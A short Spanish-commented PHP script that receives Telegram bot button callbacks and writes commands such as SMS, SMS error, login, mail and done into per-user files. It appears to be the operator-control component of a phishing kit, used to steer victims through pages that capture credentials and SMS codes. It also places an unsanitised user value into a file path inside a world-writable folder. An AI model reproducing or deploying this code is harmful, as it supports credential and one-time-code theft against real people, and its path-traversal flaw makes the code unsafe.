<?php
// ========================================
// BOT.PHP - Maneja los callbacks de Telegram
// Configura el webhook de tu bot a esta URL
// ========================================

include("settings.php");

$update = json_decode(file_get_contents("php://input"), true);

if (isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $callback_id = $callback['id'];
    $data = $callback['data'];

    $partes = explode("|", $data);
    $accion = $partes[0];
    $usuario = $partes[1] ?? '';

    if ($usuario) {
        if (!is_dir("acciones")) {
            mkdir("acciones", 0777, true);
        }

        $archivo = "acciones/$usuario.txt";

        switch ($accion) {
            case "SMS":
                file_put_contents($archivo, "/SMS");
                break;
            case "SMSERROR":
                file_put_contents($archivo, "/SMSERROR");
                break;
            case "LOGIN":
                file_put_contents($archivo, "/LOGIN");
                break;
            case "MAIL":
                file_put_contents($archivo, "/MAIL");
                break;
            case "LISTO":
                file_put_contents($archivo, "/LISTO");
                break;
            default:
                file_put_contents($archivo, "/ERROR");
                break;
        }

        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            'callback_query_id' => $callback_id,
            'text' => "✅ Acción enviada para $usuario",
            'show_alert' => false
        ]));
    }
}
